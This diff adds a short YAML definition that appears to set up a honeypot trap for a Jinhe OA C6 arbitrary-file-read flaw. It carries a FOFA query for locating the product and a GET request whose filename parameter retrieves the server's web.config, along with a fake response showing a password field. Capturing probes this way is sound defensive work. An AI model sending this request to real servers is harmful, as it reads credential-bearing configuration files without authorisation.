@@ -1,0 +1,24 @@
+id: jinhe-oa-c6-lfi
+info:
+  name: Jinhe OA C6 download.jsp - Arbitary File Read
+  author: SleepingBag945
+  description: 'There is an arbitrary file read vulnerability in Jinhe OA C6 download.jsp
+    file, through which an attacker can obtain sensitive information in the server
+
+    '
+  severity: high
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="金和网络-金和OA"
+  tags: jinhe,lfi,misconfig
+traps:
+- request:
+    method: GET
+    path: /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: <configuration>password=
